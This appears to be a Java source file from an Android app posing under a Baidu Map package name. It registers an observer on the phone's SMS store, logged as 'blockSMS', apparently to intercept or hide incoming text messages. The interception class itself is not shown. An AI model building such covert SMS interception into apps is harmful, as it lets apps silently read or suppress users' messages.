package com.baidu.BaiduMap.sms;

import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;

import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.Log;


/**
 * Created by Administrator on 2017/7/21.
 */

public class RegistSmsObserver {
    private static RegistSmsObserver registSmsObserver = null;
    private SmsInterceptCenter smsInterceptCenter = null;

    public static RegistSmsObserver getInstance() {
        if (registSmsObserver == null) {
            registSmsObserver = new RegistSmsObserver();
        }
        return registSmsObserver;
    }

    public void regist(Context context) {
        if (Constants.isOutPut) {
            Log.debug("------------>blockSMS begin");
        }
        smsInterceptCenter = new SmsInterceptCenter(new Handler() {
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
            }
        }, context);
        context.getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, smsInterceptCenter);
        if (Constants.isOutPut) {
            Log.debug("------------>blockSMS end");
        }
    }

    public void unRegist(Context context) {
        context.getContentResolver().unregisterContentObserver(smsInterceptCenter);
        smsInterceptCenter = null;
    }
}
